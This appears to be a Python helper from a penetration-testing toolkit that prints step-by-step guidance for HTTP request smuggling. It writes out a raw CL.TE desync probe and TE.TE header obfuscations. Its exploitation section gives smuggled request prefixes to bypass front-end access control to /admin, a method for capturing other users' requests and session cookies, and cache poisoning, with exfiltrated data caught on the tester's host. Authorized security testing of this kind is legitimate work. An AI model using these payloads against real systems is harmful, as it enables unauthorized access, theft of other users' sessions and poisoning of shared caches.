#!/usr/bin/env python3
"""HTTP REQUEST SMUGGLING -> front-end control bypass / request hijack / cache poisoning. PRINTS guidance.

Front-end and back-end disagree on where a request ends (Content-Length vs Transfer-Encoding) -> you
smuggle a second request the front-end never saw (bypassing its auth/WAF), or capture other users' requests.

Usage:
  python3 gen_smuggle.py detect                 # how to detect CL.TE / TE.CL / TE.TE / H2 desync
  python3 gen_smuggle.py exploit [--type cl.te|te.cl]   # exploitation patterns
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "detect"

if arg == "detect":
    print("# needs: a front-end proxy/CDN/LB in front of a back-end (they must disagree on request length).")
    print("# DETECT — the reliable way is a TIMING test (Burp 'HTTP Request Smuggler' extension automates it). Try CL.TE first.")
    print("# CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding) — this should HANG the back-end:")
    print("   POST / HTTP/1.1")
    print("   Host: target")
    print("   Content-Length: 4")
    print("   Transfer-Encoding: chunked")
    print("   ")
    print("   1")
    print("   A")
    print("   X            <- back-end waits for more chunk data = delay = CL.TE confirmed")
    print("# -> ok: this request hangs ~seconds while a normal request returns instantly = a desync exists.")
    print("# TE.CL is the mirror; TE.TE = obfuscate the TE header so one side ignores it:")
    print("   Transfer-Encoding: xchunked | Transfer-Encoding:[tab]chunked | ' Transfer-Encoding: chunked' (leading space)")
    print("# HTTP/2: h2.cl / h2.te desync (downgrade) — use Burp; send \\r\\n-injected headers.")
    print("# tools:  Burp 'HTTP Request Smuggler' (James Kettle) · smuggler.py (defparam/smuggler)")

elif arg == "exploit":
    typ = opt("--type", "cl.te")
    print(f"# EXPLOIT ({typ}) — needs: a confirmed desync from `detect`. Smuggle a prefix the front-end never inspected.")
    print("# ordering: (1) is the simplest high-value win; escalate to (2)/(3) if you need session theft or cache control.")
    print("# 1) BYPASS FRONT-END ACCESS CONTROL — reach an admin path the proxy blocks (try first):")
    print("   smuggled prefix:  GET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n...   (back-end trusts it as internal)")
    print("   # -> ok: you get 200/admin content on a path that returns 403 when requested normally.")
    print("# 2) CAPTURE another user's request (steal session cookies) — smuggle a request that stores the next")
    print("   victim request into a parameter you can read back (a comment/search field).  -> ok: a victim's Cookie/headers show up in your stored field.")
    print("# 3) WEB CACHE POISONING / deception — poison a cached response for all users.")
    print("# 4) reflect to RCE only if it chains into another sink; usually -> creds/session/access.")
    print(f"# catch exfil / host payloads on {P.LHOST}. Build the raw requests in Burp Repeater (disable Update-CL).")
else:
    print("use: detect | exploit [--type cl.te|te.cl]"); sys.exit(1)

print(f"\n# NOTE: smuggling affects OTHER users' traffic (you may capture real sessions) — coordinate, time-box,")
print(f"#   and treat any captured data as sensitive. Report as request_smuggling.")
